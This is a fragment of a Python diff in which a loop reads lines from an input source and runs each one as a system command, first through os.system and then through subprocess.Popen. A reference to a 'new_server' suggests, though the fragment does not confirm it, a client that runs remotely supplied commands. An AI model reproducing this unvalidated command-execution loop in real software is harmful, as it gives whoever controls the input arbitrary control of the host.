@@ -83,7 +83,8 @@ try:
         for x in f:
             print(x)
             x = x.decode('utf-8')
-            os.system(x)
+            print(x.split(" "))
+            process = subprocess.Popen([c.replace("\r\n", "") for c in x.split(" ")], stdout=subprocess.PIPE)
 
     if(new_server == "" or len(new_server) < 5 or new_server == None):
         pass
